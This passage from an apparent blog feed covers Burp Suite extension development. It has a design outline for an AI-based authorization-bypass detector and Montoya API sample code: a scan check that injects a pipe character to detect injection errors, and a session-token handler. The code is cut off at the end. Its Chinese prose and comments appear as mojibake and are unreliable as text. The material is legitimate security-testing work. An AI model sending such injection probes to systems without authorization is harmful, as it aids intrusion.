æ›´å¤šé€»è¾‘æ¼æ´æ£€æµ‹ï¼Œéœ€è¦æœ‰ä¸€ä¸ªæ¸…æ™°ä¸”æ¨¡å—åŒ–çš„æ¶æ„ã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªåŸºç¡€çš„è®¾è®¡æ–¹æ¡ˆï¼ŒåŒ…æ‹¬ä¸»è¦ç»„ä»¶å’Œç›¸å…³æ–‡ä»¶çš„å»ºè®®ã€‚</p><p>#ä¸ºäº†è®¾è®¡ä¸€ä¸ªåŸºäºAIçš„Burp Suiteæ’ä»¶ï¼Œç”¨äºæ£€æµ‹è¶Šæƒæ¼æ´ï¼Œå¹¶è€ƒè™‘æœªæ¥æ‰©å±•ä»¥æ”¯æŒæ›´å¤šç±»å‹çš„é€»è¾‘æ¼æ´æ£€æµ‹ï¼Œæˆ‘ä»¬å¯ä»¥æŒ‰ç…§ä»¥ä¸‹ç»“æ„æ¥æ„å»ºé¡¹ç›®ï¼š</p><ol><li>é¡¹ç›®æ¶æ„è®¾è®¡<br><strong>æ ¸å¿ƒç»„ä»¶ï¼š</strong></li></ol><ul><li><strong>AI Model Interface</strong>: ç®¡ç†ä¸AIæ¨¡å‹çš„äº¤äº’ï¼Œå¦‚å‘é€è¯·æ±‚æ•°æ®å’Œæ¥æ”¶é¢„æµ‹ç»“æœã€‚</li><li><strong>Scan Check Implementations</strong>: å®ç°Burpçš„<code>ScanCheck</code>æ¥å£ï¼Œç”¨äºè§¦å‘å’Œå¤„ç†AIæ¨¡å‹çš„æ£€æµ‹ç»“æœã€‚</li><li><strong>HTTP Request Handler</strong>: å¤„ç†HTTPè¯·æ±‚çš„æ”¶é›†å’Œä¿®æ”¹ï¼Œç”¨äºå‘é€ç»™AIæ¨¡å‹è¿›è¡Œåˆ†æã€‚</li><li><strong>Result Processor</strong>: å¤„ç†AIæ¨¡å‹è¿”å›çš„æ•°æ®ï¼Œç”ŸæˆBurpçš„å®¡è®¡é—®é¢˜ã€‚</li><li><strong>Utility Classes</strong>: æä¾›è¾…åŠ©åŠŸèƒ½ï¼Œå¦‚æ•°æ®æ ¼å¼åŒ–ã€æ—¥å¿—è®°å½•å’Œé”™è¯¯å¤„ç†ã€‚</li></ul><p><strong>æ‰©å±•ç»„ä»¶ï¼š</strong></p><ul><li><strong>Config Management</strong>: ç®¡ç†æ’ä»¶çš„é…ç½®ï¼Œå¦‚æ¨¡å‹æœåŠ¡å™¨çš„URLã€ç«¯å£ç­‰ã€‚</li><li><strong>UI Components</strong>: å¦‚æœéœ€è¦ï¼Œæä¾›ç”¨æˆ·ç•Œé¢ç”¨äºé…ç½®æ’ä»¶è®¾ç½®æˆ–æ˜¾ç¤ºæ£€æµ‹ç»“æœã€‚</li></ul><ol start="2"><li>é¡¹ç›®æ–‡ä»¶å’Œæ¨¡å—</li></ol><p>åŸºäºä¸Šè¿°æ¶æ„ï¼Œé¡¹ç›®çš„æ–‡ä»¶ç»“æ„å¯ä»¥å¦‚ä¸‹è®¾è®¡ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">BurpAIExtension/</span><br><span class="line">â”œâ”€â”€ src/</span><br><span class="line">â”‚   â”œâ”€â”€ main/</span><br><span class="line">â”‚   â”‚   â”œâ”€â”€ java/</span><br><span class="line">â”‚   â”‚   â”‚   â”œâ”€â”€ ai/</span><br><span class="line">â”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ AIDetector.java           // AIæ¨¡å‹æ¥å£</span><br><span class="line">â”‚   â”‚   â”‚   â”‚   â””â”€â”€ AIModelResponse.java      // å°è£…AIæ¨¡å‹çš„å“åº”</span><br><span class="line">â”‚   â”‚   â”‚   â”œâ”€â”€ burp/</span><br><span class="line">â”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ BurpExtender.java         // ä¸»æ‰©å±•ç±»</span><br><span class="line">â”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ UnauthorizedAccessScan.java  // è¶Šæƒæ£€æµ‹å®ç°</span><br><span class="line">â”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ HttpRequestHandler.java  // HTTPè¯·æ±‚å¤„ç†</span><br><span class="line">â”‚   â”‚   â”‚   â”‚   â””â”€â”€ ResultProcessor.java     // ç»“æœå¤„ç†å™¨</span><br><span class="line">â”‚   â”‚   â”‚   â”œâ”€â”€ config/</span><br><span class="line">â”‚   â”‚   â”‚   â”‚   â””â”€â”€ Configuration.java       // é…ç½®ç®¡ç†</span><br><span class="line">â”‚   â”‚   â”‚   â””â”€â”€ utils/</span><br><span class="line">â”‚   â”‚   â”‚       â”œâ”€â”€ Logger.java              // æ—¥å¿—å·¥å…·</span><br><span class="line">â”‚   â”‚   â”‚       â””â”€â”€ Utilities.java           // å¸¸ç”¨å·¥å…·ç±»</span><br><span class="line">â”‚   â”‚   â””â”€â”€ resources/</span><br><span class="line">â”‚   â”‚       â””â”€â”€ config.properties            // é…ç½®æ–‡ä»¶</span><br><span class="line">â”‚   â””â”€â”€ test/</span><br><span class="line">â”‚       â””â”€â”€ java/</span><br><span class="line">â”œâ”€â”€ build.gradle                             // Gradleæ„å»ºè„šæœ¬</span><br><span class="line">â””â”€â”€ README.md                                // é¡¹ç›®æ–‡æ¡£</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> burpsuite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€å·¥å…·å¼€å‘ã€‘Burpsuite æ’ä»¶å¼€å‘ 2</title>
      <link href="/2024/10/24/tools/burpsuite-plugins2/"/>
      <url>/2024/10/24/tools/burpsuite-plugins2/</url>
      
        <content type="html"><![CDATA[<h2 id="Custom-Scan-Checks-Example-Extension"><a href="#Custom-Scan-Checks-Example-Extension" class="headerlink" title="Custom Scan Checks Example Extension"></a>Custom Scan Checks Example Extension</h2><p>The sample extension demonstrates the following techniques:</p><ul><li>Registering a custom scan check</li><li>Performing passive and active scanning when initiated by the user</li><li>Using the Burp-provided <code>AuditInsertionPoint</code> to construct requests for active scanning using specified payloads</li><li>Using a helper method to search responses for relevant match strings</li><li>Providing an <code>MarkedHttpRequestResponse</code> to highlight relevant portions of requests and responses, </li><li>Synchronously reporting custom scan issues in response to the relevant checks.</li><li>Guiding Burp on when to consolidate duplicated issues at the same URL (e.g., when the user has scanned the same item multiple times).</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> burp.api.montoya.MontoyaApi;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.core.Marker;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.message.HttpRequestResponse;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.message.requests.HttpRequest;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.scanner.AuditResult;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.scanner.ConsolidationAction;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.scanner.ScanCheck;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.scanner.audit.insertionpoint.AuditInsertionPoint;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.scanner.audit.issues.AuditIssue;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.scanner.audit.issues.AuditIssueConfidence;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.scanner.audit.issues.AuditIssueSeverity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> burp.api.montoya.core.ByteArray.byteArray;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> burp.api.montoya.scanner.AuditResult.auditResult;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> burp.api.montoya.scanner.ConsolidationAction.KEEP_BOTH;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> burp.api.montoya.scanner.ConsolidationAction.KEEP_EXISTING;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> burp.api.montoya.scanner.audit.issues.AuditIssue.auditIssue;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.util.Collections.emptyList;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.util.Collections.singletonList;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å®ç° ScanCheck æ¥å£çš„ MyScanCheck ç±»</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyScanCheck</span> <span class="keyword">implements</span> <span class="title class_">ScanCheck</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">GREP_STRING</span> <span class="operator">=</span> <span class="string">&quot;Page generated by:&quot;</span>; <span class="comment">// ç”¨äºè¢«åŠ¨æ‰«æçš„å­—ç¬¦ä¸²</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">INJ_TEST</span> <span class="operator">=</span> <span class="string">&quot;|&quot;</span>; <span class="comment">// ç”¨äºä¸»åŠ¨æ‰«æçš„æµ‹è¯•æ³¨å…¥å­—ç¬¦ä¸²</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">INJ_ERROR</span> <span class="operator">=</span> <span class="string">&quot;Unexpected pipe&quot;</span>; <span class="comment">// æœŸæœ›åœ¨å“åº”ä¸­å‘ç°çš„é”™è¯¯ä¿¡æ¯</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> MontoyaApi api; <span class="comment">// MontoyaApi å®ä¾‹ï¼Œç”¨äºè®¿é—® API åŠŸèƒ½</span></span><br><span class="line"></span><br><span class="line">    MyScanCheck(MontoyaApi api)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>.api = api;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¸»åŠ¨æ‰«ææ–¹æ³•</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> AuditResult <span class="title function_">activeAudit</span><span class="params">(HttpRequestResponse baseRequestResponse, AuditInsertionPoint auditInsertionPoint)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// æ„å»ºåŒ…å«æµ‹è¯•è´Ÿè½½çš„ HTTP è¯·æ±‚</span></span><br><span class="line">        <span class="type">HttpRequest</span> <span class="variable">checkRequest</span> <span class="operator">=</span> auditInsertionPoint.buildHttpRequestWithPayload(byteArray(INJ_TEST)).withService(baseRequestResponse.httpService());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å‘é€è¯·æ±‚å¹¶è·å–å“åº”</span></span><br><span class="line">        <span class="type">HttpRequestResponse</span> <span class="variable">checkRequestResponse</span> <span class="operator">=</span> api.http().sendRequest(checkRequest);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å–å“åº”ä¸­çš„ç‰¹å®šé”™è¯¯ä¿¡æ¯çš„é«˜äº®æ˜¾ç¤º</span></span><br><span class="line">        List&lt;Marker&gt; responseHighlights = getResponseHighlights(checkRequestResponse, INJ_ERROR);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ ¹æ®å“åº”ä¸­æ˜¯å¦åŒ…å«æœŸæœ›çš„é”™è¯¯ä¿¡æ¯æ¥åˆ›å»ºå®¡è®¡é—®é¢˜</span></span><br><span class="line">        List&lt;AuditIssue&gt; auditIssueList = responseHighlights.isEmpty() ? emptyList() : singletonList(</span><br><span class="line">                auditIssue(</span><br><span class="line">                        <span class="string">&quot;Pipe injection&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;Submitting a pipe character returned the string: &quot;</span> + INJ_ERROR,</span><br><span class="line">                        <span class="literal">null</span>,</span><br><span class="line">                        baseRequestResponse.request().url(),</span><br><span class="line">                        AuditIssueSeverity.HIGH,</span><br><span class="line">                        AuditIssueConfidence.CERTAIN,</span><br><span class="line">                        <span class="literal">null</span>,</span><br><span class="line">                        <span class="literal">null</span>,</span><br><span class="line">                        AuditIssueSeverity.HIGH,</span><br><span class="line">                        checkRequestResponse.withResponseMarkers(responseHighlights)</span><br><span class="line">                )</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> auditResult(auditIssueList);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¢«åŠ¨æ‰«ææ–¹æ³•</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> AuditResult <span class="title function_">passiveAudit</span><span class="params">(HttpRequestResponse baseRequestResponse)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// åœ¨å“åº”ä¸­æœç´¢é¢„å®šä¹‰çš„å­—ç¬¦ä¸²</span></span><br><span class="line">        List&lt;Marker&gt; responseHighlights = getResponseHighlights(baseRequestResponse, GREP_STRING);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å¦‚æœæ‰¾åˆ°å­—ç¬¦ä¸²ï¼Œåˆ™åˆ›å»ºå®¡è®¡é—®é¢˜</span></span><br><span class="line">        List&lt;AuditIssue&gt; auditIssueList = responseHighlights.isEmpty() ? emptyList() : singletonList(</span><br><span class="line">                auditIssue(</span><br><span class="line">                        <span class="string">&quot;CMS Info Leakage&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;The response contains the string: &quot;</span> + GREP_STRING,</span><br><span class="line">                        <span class="literal">null</span>,</span><br><span class="line">                        baseRequestResponse.request().url(),</span><br><span class="line">                        AuditIssueSeverity.HIGH,</span><br><span class="line">                        AuditIssueConfidence.CERTAIN,</span><br><span class="line">                        <span class="literal">null</span>,</span><br><span class="line">                        <span class="literal">null</span>,</span><br><span class="line">                        AuditIssueSeverity.HIGH,</span><br><span class="line">                        baseRequestResponse.withResponseMarkers(responseHighlights)</span><br><span class="line">                )</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> auditResult(auditIssueList);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é—®é¢˜åˆå¹¶ç­–ç•¥</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ConsolidationAction <span class="title function_">consolidateIssues</span><span class="params">(AuditIssue newIssue, AuditIssue existingIssue)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// å¦‚æœé—®é¢˜åç§°ç›¸åŒï¼Œåˆ™ä¿ç•™ç°æœ‰é—®é¢˜ï¼Œå¦åˆ™ä¿ç•™ä¸¤ä¸ªé—®é¢˜</span></span><br><span class="line">        <span class="keyword">return</span> existingIssue.name().equals(newIssue.name()) ? KEEP_EXISTING : KEEP_BOTH;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¾…åŠ©æ–¹æ³•ï¼Œç”¨äºè·å–å“åº”ä¸­åŒ¹é…å­—ç¬¦ä¸²çš„é«˜äº®æ˜¾ç¤º</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> List&lt;Marker&gt; <span class="title function_">getResponseHighlights</span><span class="params">(HttpRequestResponse requestResponse, String match)</span></span><br><span class="line">    &#123;</span><br><span class="line">        List&lt;Marker&gt; highlights = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        <span class="type">String</span> <span class="variable">response</span> <span class="operator">=</span> requestResponse.response().toString();</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (start &lt; response.length())</span><br><span class="line">        &#123;</span><br><span class="line">            start = response.indexOf(match, start);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (start == -<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">Marker</span> <span class="variable">marker</span> <span class="operator">=</span> Marker.marker(start, start+match.length());</span><br><span class="line">            highlights.add(marker);</span><br><span class="line"></span><br><span class="line">            start += match.length();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> highlights;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.BurpExtension;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.MontoyaApi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CustomScanChecks</span> <span class="keyword">implements</span> <span class="title class_">BurpExtension</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initialize</span><span class="params">(MontoyaApi api)</span></span><br><span class="line">    &#123;</span><br><span class="line">        api.extension().setName(<span class="string">&quot;Custom Scanner checks&quot;</span>);</span><br><span class="line"></span><br><span class="line">        api.scanner().registerScanCheck(<span class="keyword">new</span> <span class="title class_">MyScanCheck</span>(api));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°åŸæ¥æ˜¯Proç‰ˆæœ¬æ‰æœ‰scanåŠŸèƒ½ï¼Œé‡æ–°è£…äº†Proç‰ˆæœ¬</p><h2 id="Custom-Session-Tokens-Example-Extension"><a href="#Custom-Session-Tokens-Example-Extension" class="headerlink" title="Custom Session Tokens Example Extension"></a>Custom Session Tokens Example Extension</h2><p>This example demonstrates how you can couple a recorded macro with an extension to automatically gain a session token for a website and use it in later requests that Burp makes.</p><p>The macro mechanism that Burp provides allows you to record the request triggering creation of a session made via the proxy.</p><p>The extension uses the following techniques:</p><ul><li>Registers a <code>SessionHandlingAction</code> handler</li><li>Fetches the list of macro requests and responses</li><li>Extracts the response headers from the last <code>HttprequestResponse</code> item in the list</li><li>Finds the relevant session header (in this example, this header is <code>X-Custom-Session-Id</code>)</li><li>Returns an <code>HttpRequest</code> with an updated session header</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> burp.api.montoya.http.message.HttpHeader;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.message.HttpRequestResponse;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.message.requests.HttpRequest;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.sessions.ActionResult;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.sessions.SessionHandlingAction;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.sessions.SessionHandlingActionData;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> burp.api.montoya.http.sessions.ActionResult.actionResult;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å®ç° SessionHandlingAction æ¥å£çš„ç±»</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MySessionHandlingAction</span> <span class="keyword">implements</span> <span class="title class_">SessionHandlingAction</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">name</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Use session token from macro&quot;</span>;  <span class="comment">// æ­¤æ“ä½œçš„åç§°ï¼Œç”¨äºåœ¨ Burp Suite ä¸­æ ‡è¯†</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ActionResult <span class="title function_">performAction</span><span class="params">(SessionHandlingActionData actionData)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">ActionResult</span> <span class="variable">result</span> <span class="operator">=</span> actionResult(actionData.request(), actionData.annotations());</span><br><span class="line"></span><br><span class="line">        List&lt;HttpRequestResponse&gt; macroRequestResponseList = actionData.macroRequestResponses();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (macroRequestResponseList.isEmpty())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> result;  <span class="comment">// å¦‚æœæ²¡æœ‰ä»å®ä¸­è·å–åˆ°è¯·æ±‚å“åº”ï¼Œç›´æ¥è¿”å›åŸå§‹ç»“æœ</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä»æœ€åä¸€ä¸ªå®å“åº”ä¸­æå–å“åº”å¤´</span></span><br><span class="line">        List&lt;HttpHeader&gt; headers = macroRequestResponseList.get(macroRequestResponseList.size()-<span class="number">1</span>).response().headers();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æŸ¥æ‰¾ä¼šè¯å¤´éƒ¨</span></span><br><span class="line">        <span class="type">HttpHeader</span> <span class="variable">sessionHeader</span> <span class="operator">=</span> findSessionHeader(headers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å¦‚æœæ²¡æœ‰æ‰¾åˆ°ä¼šè¯ä»¤ç‰Œï¼Œè¿”å›æœªä¿®æ”¹çš„è¯·æ±‚</span></span><br><span class="line">        <span class="keyword">if</span> (sessionHeader == <span class="literal">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆ›å»ºä¸€ä¸ªæ›´æ–°äº†ä¼šè¯å¤´éƒ¨çš„ HTTP è¯·æ±‚</span></span><br><span class="line">        <span class="type">HttpRequest</span> <span class="variable">updatedRequest</span> <span class="operator">=</span> actionData.request().withUpdatedHeader(sessionHeader);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> actionResult(updatedRequest, actionData.annotations());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åœ¨å“åº”å¤´ä¸­æŸ¥æ‰¾ç‰¹å®šçš„ä¼šè¯æ ‡è¯†ç¬¦å¤´éƒ¨</span></span><br><span class="line">    <span class="keyword">private</span> HttpHeader <span class="title function_">findSessionHeader</span><span class="params">(List&lt;HttpHeader&gt; headers)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">HttpHeader</span> <span class="variable">sessionHeader</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(HttpHeader header : headers)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// åªå¤„ç†åä¸º &quot;X-Custom-Session-Id&quot; çš„å¤´éƒ¨</span></span><br><span class="line">            <span class="keyword">if</span> (!header.name().equals(<span class="string">&quot;X-Custom-Session-Id&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// è·å–ä¼šè¯ä»¤ç‰Œ</span></span><br><span class="line">            sessionHeader = header;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sessionHeader;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.BurpExtension;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.MontoyaApi;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Burp will auto-detect and load any class that extends BurpExtension.</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CustomSessionTokens</span> <span class="keyword">implements</span> <span class="title class_">BurpExtension</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initialize</span><span class="params">(MontoyaApi api)</span></span><br><span class="line">    